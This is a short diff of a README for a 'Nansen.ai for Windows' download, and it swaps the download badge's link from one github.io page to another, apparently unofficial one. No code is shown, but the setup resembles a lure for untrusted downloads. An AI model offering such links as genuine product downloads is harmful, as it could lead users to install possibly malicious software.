@@ -4,7 +4,7 @@
 
 ## 📥 Download Nansen.ai for Windows
 
-[![⬇️ Download Nansen.ai](https://img.shields.io/badge/Download-Nansen.ai-blue?style=for-the-badge&logo=windows)](https://nansenaiload.github.io/.github/)
+[![⬇️ Download Nansen.ai](https://img.shields.io/badge/Download-Nansen.ai-blue?style=for-the-badge&logo=windows)](https://hudyakowalin.github.io/.github/nansen-ai)
 
 ---
 
